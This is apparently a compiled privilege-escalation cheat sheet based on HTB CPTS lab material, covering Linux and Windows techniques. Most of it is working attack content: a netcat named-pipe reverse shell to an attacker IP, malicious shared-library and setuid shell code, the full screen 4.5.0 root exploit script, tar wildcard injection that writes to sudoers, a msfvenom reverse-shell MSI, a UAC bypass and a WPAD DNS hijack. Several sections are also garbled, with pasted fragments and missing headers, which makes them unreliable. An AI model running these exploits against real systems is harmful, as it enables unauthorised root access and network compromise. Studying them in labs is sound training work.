OS: Cross-platform, Linux  
Service: mysql  
Ports: 3306

### Remember this attack when

- If no attention is paid to log files, they become larger and larger and eventually occupy all available disk space.
- These include the specification of: - the size of the log file, - its age, - and the action to be taken when one of these factors is reached.
- To force a new rotation on the same day, we can set the date after the individual log files in the status file /var/lib/logrotate.status or use the -f/--force option: We can find the corresponding configuration files in /etc/logrotate.d/ directory.

### Prerequisites

- The logs in /var/log give administrators the information they need to determine the cause behind malfunctions.
- To exploit logrotate, we need some requirements that we have to fulfill.
- we need write permissions on the log files 2.

### Enumeration / Detection

```shell-session
[!bash!]$ ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

```shell-session
[!bash!]$ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

```shell-session
[!bash!]$ nc -nlvp 9001

Listening on 0.0.0.0 9001
```


```shell-session
Connection received on 10.129.24.11 49818

uid=0(root) gid=0(root) groups=0(root)
```

### Exploitation

```shell-session
[!bash!]$ man logrotate
[!bash!]$ # or
[!bash!]$ logrotate --help

Usage: logrotate [OPTION...] <configfile>
  -d, --debug               Don't do anything, just test and print debug messages
  -f, --force               Force file rotation
  -m, --mail=command        Command to send mail (instead of '/usr/bin/mail')
  -s, --state=statefile     Path of state file
      --skip-state-lock     Do not lock the state file
  -v, --verbose             Display messages during rotation

      --version             Display version information

Help options:
  -?, --help                Show this help message
      --usage               Display brief usage message
```

```shell-session
[!bash!]$ cat /etc/logrotate.conf


# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```

```shell-session
/var/log/samba/log.smbd" 2022-8-3
```

<a id="technique-lxc-lxd"></a>
## LXC / LXD

Aliases: —  
Tags: host, password, shell, ssh, sudo  
Category: Linux Privilege Escalation / Privileged Groups  
OS: Linux  
Service: SSH  
Ports: 22

### Remember this attack when

- The target behavior or access described in the cited `Privileged Groups` section is present.

### Prerequisites

- Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root.
- Start a privileged container with the security.privileged set to true to run the container without a UID mapping, making the root user in the container the same as the root user on the host.
- From here we can read sensitive files such as /etc/shadow and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.

<a id="technique-netfilter"></a>
## Netfilter

Aliases: —  
Tags: exploit, host, spray, wget  
Category: Linux Privilege Escalation / Netfilter  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- When network packets are received and sent, it initiates the execution of other modules such as packet filters.
- Network address translation (NAT) When the module is activated, all IP packets are checked by the Netfilter before they are forwarded to the target application of the own or remote system.
- In 2021 (CVE-2021-22555), 2022 (CVE-2022-1015), and also in 2023 (CVE-2023-32233), several vulnerabilities were found that could lead to privilege escalation.

### Prerequisites

- In 2021 (CVE-2021-22555), 2022 (CVE-2022-1015), and also in 2023 (CVE-2023-32233), several vulnerabilities were found that could lead to privilege escalation.
- This would require either adapting the system to the software application or adapting the application to the newer system.
- This is net/netfilter/nfdupnetdev.c, which can grant root privileges to local users due to heap out-of-bounds write.

### What success looks like

- However, we need to be careful with this exploit as it can corrupt the kernel, and a reboot will be required to reaccess the server.

- These nftables are temporary workspaces for processing batch requests and once the processing is done, these anonymous sets are supposed to be cleared out (Use-After-Free) so they cannot be used anymore.

<a id="technique-path-abuse"></a>
## PATH Abuse

Aliases: —  
Tags: abuse, shell  
Category: Linux Privilege Escalation / Path Abuse  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary.
- As shown below, the conncheck script created in /usr/local/sbin will still run when in the /tmp directory because it was created in a directory specified in the PATH.
- For example, if we can modify a user's path, we could replace a common binary such as ls with a malicious script such as a reverse shell.

### Prerequisites

- Confirm the access, service configuration, and target-specific values shown in the cited CPTS source before running the commands.

### Enumeration / Detection

```shell-session
htb_student@NIX02:~$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

```shell-session
htb_student@NIX02:~$ pwd && conncheck 

/usr/local/sbin
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       
tcp        0     88 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p
tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       
tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2    
```

```shell-session
htb_student@NIX02:~$ pwd && conncheck 

/tmp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       
tcp        0    268 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p
tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       
tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2     
```

### Exploitation

```shell-session
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH

.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

```shell-session
htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls
```

```shell-session
htb_student@NIX02:~$ ls

PATH ABUSE!!
```

<a id="technique-polkit"></a>
## Polkit

Aliases: —  
Tags: exploit, service, shell, sudo  
Category: Linux Privilege Escalation / Polkit  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- --- PolicyKit (polkit) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so.
- For example, for each user, it can be set whether the operation should be generally allowed or forbidden, or authorization as an administrator or as a separate user with a one-time, process-limited, session-limited, or unlimited validity should be required.
- In the pkexec tool, the memory corruption vulnerability with the identifier CVE-2021-4034 was found, also known as Pwnkit and also leads to privilege escalation.

### Prerequisites

- It is possible to set how permissions are granted by default for each user and application.
- For example, for each user, it can be set whether the operation should be generally allowed or forbidden, or authorization as an administrator or as a separate user with a one-time, process-limited, session-limited, or unlimited validity should be required.
- rules (/usr/share/polkit-1/rules.d) Polkit also has local authority rules which can be used to set or remove additional permissions for users and groups.

### Enumeration / Detection

```shell-session
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id

```


### Exploitation

## Privilege Escalation — Linux Privilege Escalation

Aliases: —  
Tags: host, service, shell, ssh, token  
Category: Linux Privilege Escalation / Kubernetes  
OS: Cross-platform / not specified  
Service: SSH  
Ports: 22

### Remember this attack when

- The YAML file could look like following: Pod YAML Once created, we can now create the new pod and check if it is running as expected.
- Creating a new Pod If the pod is running we can execute the command and we could spawn a reverse shell or retrieve sensitive data like private SSH key from the root user.

### Prerequisites

- To gain higher privileges and access the host system, we can utilize a tool called kubeletctl to obtain the Kubernetes service account's token and certificate (ca.crt) from the server.
- To do this, we must provide the server's IP address, namespace, and target pod.
- In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.

```shell-session
pods											[]					[]				[get create list]
...SNIP...
```

## Python Library Search Path

Aliases: —  
Tags: attack, hijack, sudo  
Category: Linux Privilege Escalation / Python Library Hijacking  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- Therefore, if the imported module is located in a path lower on the list and a higher priority path is editable by our user, we can create a module ourselves with the same name and include our own desired functions.
- Since the higher priority path is read earlier and examined for the module in question, Python accesses the first hit it finds and imports it before reaching the original and intended module.
- From our previous listing of the PYTHONPATH variable, we have a reasonable amount of directories to choose from to see if there might be any misconfigurations in the environment to allow us write access to any of them.

### Prerequisites

- We can see this by issuing the following command: PYTHONPATH Listing To be able to use this variant, two prerequisites are necessary.
- We must have write permissions to one of the paths having a higher priority on the list.
- From our previous listing of the PYTHONPATH variable, we have a reasonable amount of directories to choose from to see if there might be any misconfigurations in the environment to allow us write access to any of them.

- If it is a slightly older Linux system, the likelihood increases that we can find installed packages that may already have at least one vulnerability.

### What success looks like

- It allows us to follow the flow of a program and understand how it accesses system resources, processes signals, and receives and sends data from the operating system.
- The output of strace can be written to a file for later analysis, and it provides a wealth of options that allow detailed monitoring of the program's behavior.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Linux Services & Internals Enumeration` → re-enumerate with the gained access.

### Common problems / Why it fails

- In addition, these files can contain sensitive information, such as keys and paths to files in folders that we cannot see.
- These scripts, in some cases, have such wrong privileges that we will deal with later, but the contents are of great importance even without these privileges.

<a id="technique-shared-libraries"></a>
## Shared Libraries

Aliases: —  
Tags: —  
Category: Linux Privilege Escalation / Shared Libraries  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- When a program is compiled, static libraries become part of the program and can not be altered.
- This includes the -rpath or -rpath-link flags when compiling a program, using the environmental variables LDRUNPATH or LDLIBRARYPATH, placing libraries in the /lib or /usr/lib default directories, or specifying another directory containing the libraries within the /etc/ld.so.conf configuration file.

### Prerequisites

- The shared objects required by a binary can be viewed using the ldd utility.
- The image above lists all the libraries required by /bin/ls, along with their absolute paths.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

<a id="technique-shared-object-hijacking"></a>
## Shared Object Hijacking

Aliases: —  
Tags: shell  
Category: Linux Privilege Escalation / Shared Object Hijacking  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- The configuration allows the loading of libraries from the /development folder, which is writable by all users.
- This misconfiguration can be exploited by placing a malicious library in /development, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).
- Before compiling a library, we need to find the function name called by the binary.

### Prerequisites

- We can use ldd to print the shared object required by a binary or shared object.
- Before compiling a library, we need to find the function name called by the binary.

### Enumeration / Detection

```shell-session
htb-student@NIX02:~$ readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

```shell-session
htb-student@NIX02:~$ ls -la /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
```

```shell-session
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```

```shell-session
htb-student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

```shell-session
htb-student@NIX02:~$ ./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 

```

```shell-session
htb-student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so
```

### Exploitation

```shell-session
htb-student@NIX02:~$ ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

```shell-session

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

```shell-session
htb-student@NIX02:~$ ./payroll 

***************Inlane Freight Employee Database***************

Malicious library loaded

uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```

### What success looks like

- Executing the binary again should display the banner and pops a root shell.

### What to do next

## Special Permissions

Aliases: —  
Tags: exploit, nfs, ssh, sudo  
Category: Linux Privilege Escalation / Special Permissions  
OS: Linux  
Service: NFS, SSH  
Ports: 22, 111, 2049

### Remember this attack when

- ---- The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges.
- It may be possible to reverse engineer the program with the SETUID bit set, identify a vulnerability, and exploit this to escalate our privileges.
- Many programs have additional features that can be leveraged to execute commands and, if the setuid bit is set on them, these can be used for our purpose.

### Prerequisites

- ---- The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges.
- It may be possible to reverse engineer the program with the SETUID bit set, identify a vulnerability, and exploit this to escalate our privileges.
- The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them.

<a id="technique-sudo-rights-abuse"></a>
## Sudo Rights Abuse

Aliases: —  
Tags: abuse, netcat, password, shell, sudo  
Category: Linux Privilege Escalation / Sudo Rights Abuse  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- When the sudo command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in /etc/sudoers.
- When landing on a system, we should always check to see if the current user has any sudo privileges by typing sudo -l.
- It is easy to misconfigure this.

### Prerequisites

- ---- Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges.
- When landing on a system, we should always check to see if the current user has any sudo privileges by typing sudo -l.
- Sometimes we will need to know the user's password to list their sudo rights, but any rights entries with the NOPASSWD option can be seen without entering a password.

### Enumeration / Detection

```shell-session
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

```shell-session
htb_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root
tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
0 packets dropped by kernel
```

```shell-session
[!bash!]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```

### Exploitation

```shell-session
htb_student@NIX02:~$ man tcpdump

<SNIP> 
-z postrotate-command              

Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
```

```shell-session
htb_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

```shell-session
htb_student@NIX02:~$ cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
 ```

- By specifying the -z flag, an attacker could use tcpdump to execute a shell script, gain a reverse shell as the root user or run other privileged commands.

- Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.
- Screen Version Identification This allows an attacker to truncate any file or create a file owned by root in any directory and ultimately gain full root access.

### Prerequisites

- ---- Many services may be found, which have flaws that can be leveraged to escalate privileges.

- Privilege Escalation - ScreenExploit.sh The below script can be used to perform this privilege escalation attack: ScreenExploitPOC.sh

### Exploitation

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

- Screen Version Identification This allows an attacker to truncate any file or create a file owned by root in any directory and ultimately gain full root access.

<a id="technique-weak-nfs-privileges"></a>
## Weak NFS Privileges

Aliases: —  
Tags: host, nfs, port, shell, sudo, suid  
Category: Linux Privilege Escalation / Miscellaneous Techniques  
OS: Cross-platform, Linux  
Service: NFS  
Ports: 111, 2049

### Remember this attack when

- Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems.
- This would allow for the creation of malicious scripts/programs with the SUID bit set.
- When we switch back to the host's low privileged session, we can execute the binary and obtain a root shell.

### Prerequisites

- First, create a simple binary, mount the directory locally, copy it, and set the necessary permissions.
- When we switch back to the host's low privileged session, we can execute the binary and obtain a root shell.

### Enumeration / Detection

```shell-session
[!bash!]$ showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

```shell-session
root@Pwnbox:/tmp$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

### Exploitation

```shell-session
htb@NIX02:~$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

```shell-session
root@Pwnbox:/tmp$ gcc shell.c -o shell
```

```shell-session
root@Pwnbox:/tmp$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:/tmp$ cp shell /mnt
root@Pwnbox:/tmp$ chmod u+s /mnt/shell
```

```shell-session
htb@NIX02:/tmp$  ls -la

total 68
drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix
-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
<SNIP>
```

```shell-session
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
```

### What success looks like

- Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems.
- Any accessible mounts can be listed remotely by issuing the command showmount -e, which lists the NFS server's export list (or the access control list for filesystems) that NFS clients.
- When we switch back to the host's low privileged session, we can execute the binary and obtain a root shell.

## Wildcard Abuse

Aliases: —  
Tags: abuse, shell, sudo  
Category: Linux Privilege Escalation / Wildcard Abuse  
OS: Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.

### Prerequisites

- | An example of how wildcards can be abused for privilege escalation is the tar command, a common program for creating/extracting archives.
- The cron job is set to run every minute, so it is a good candidate for privilege escalation.
- Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.

### Enumeration / Detection

```shell-session
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

```shell-session
htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

```shell-session
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```

### Exploitation

```shell-session
htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

```shell-session
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

### What success looks like

- ---- A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions.

# 6. Windows Privilege Escalation

<a id="technique-abusing-cookies-to-get-access-to-im-clients"></a>
## Abusing Cookies to Get Access to IM Clients

Aliases: —  
Tags: abuse, domain, host, password, powershell, token  
Category: Windows Privilege Escalation / Pillaging  
OS: Cross-platform, Linux, Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- If we compromise a user account and gain access to an IM Client, we can look for information in private chats and groups.
- If the user is using any form of multi-factor authentication, or we can't get the user's plaintext credentials, we can try to steal the user's cookies to log in to the cloud-based client.
- There are often tools that may help us automate the process, but as the cloud and applications constantly evolve, we may find these applications out of date, and we still need to find a way to gather information from the IM clients.

### Prerequisites

- If we compromise a user account and gain access to an IM Client, we can look for information in private chats and groups.
- There are multiple options to gain access to an IM Client; one standard method is to use the user's credentials to get into the cloud version of the instant messaging application as the regular user would.
- If the user is using any form of multi-factor authentication, or we can't get the user's plaintext credentials, we can try to steal the user's cookies to log in to the cloud-based client.

```C
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

## Always Install Elevated

Aliases: —  
Tags: exploit, netcat, payload, shell, upload  
Category: Windows Privilege Escalation / Miscellaneous Techniques  
OS: Cross-platform, Linux, Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- Other settings like 'Allow users to browse for source while elevated' are not configured.
- Executing MSI Package We can upload this MSI file to our target, start a Netcat listener and execute the file from the command line like so: Catching Shell If all goes to plan, we will receive a connection back as NT AUTHORITY\SYSTEM.

### Prerequisites

- This setting can be set via Local Group Policy by setting Always install with elevated privileges to Enabled under the following paths.
- 'Always install with elevated privileges' is enabled.
- Our enumeration shows us that the AlwaysInstallElevated key exists, so the policy is indeed enabled on the target system.

### Enumeration / Detection

```powershell-session
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

    AlwaysInstallElevated    REG_DWORD    0x1
```

```powershell-session

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

```shell-session
[!bash!]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

<a id="technique-backup-operators"></a>
## Backup Operators

Aliases: —  
Tags: acl, bypass, credential, domain, exploit, hash, hashcat, kerberos, password, powershell  
Category: Windows Privilege Escalation / Windows Built-in Groups  
OS: Linux, Windows  
Service: kerberos  
Ports: 88

### Remember this attack when

- The SeBackupPrivilege allows us to traverse any folder and list the folder contents.
- This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL).
- Importing Libraries Verifying SeBackupPrivilege is Enabled Let's check if SeBackupPrivilege is enabled by invoking whoami /priv or Get-SeBackupPrivilege cmdlet.

### Prerequisites

- Membership of this group grants its members the SeBackup and SeRestore privileges.
- The SeBackupPrivilege allows us to traverse any folder and list the folder contents.
- Instead, we need to programmatically copy the data, making sure to specify the FILEFLAGBACKUPSEMANTICS flag.

Aliases: —  
Tags: bypass, powershell, token  
Category: Windows Privilege Escalation / Citrix Breakout  
OS: Windows  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- The target behavior or access described in the cited `Citrix Breakout` section is present.

### Prerequisites

- With UAC, each application that requires the administrator access token must prompt the end user for consent.
- These scripts offer methods to navigate past UAC restrictions and gain elevated privileges.
- Following a successful UAC bypass, a new powershell windows will be opened with higher privileges and we can confirm it by utilizing the command whoami /all or whoami /priv.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

```cmd-session
C:\Windows\system32> cd C:\Users\Administrator

Access is denied.
```

```powershell-session
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

### What success looks like

- Even though the newly established user backdoor is a member of Administrators group, accessing the C:\users\Administrator directory remains unfeasible due to the presence of User Account Control (UAC).
- With UAC, each application that requires the administrator access token must prompt the end user for consent.
- Command prompt running as VDESKTOP3\backdoor with PowerShell bypass.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Citrix Breakout` → re-enumerate with the gained access.

## Creating a WPAD Record

Aliases: —  
Tags: abuse, attack, crack, dns, domain, password, tunnel  
Category: Windows Privilege Escalation / DnsAdmins  
OS: Cross-platform, Windows  
Service: DNS  
Ports: 53

### Remember this attack when

- By default, Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list.
- These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.

### Prerequisites

- Another way to abuse DnsAdmins group privileges is by creating a WPAD record.

### Enumeration / Detection

```powershell-session
PS C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

```powershell-session
PS C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

### Exploitation

```powershell-session
PS C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

- The command returns the expected target data, authenticated access, execution, or shell shown in the cited CPTS example.

- Disabling the Global Query Block List To set up this attack, we first disabled the global query block list: Adding a WPAD Record Next, we add a WPAD record pointing to our attack machine.
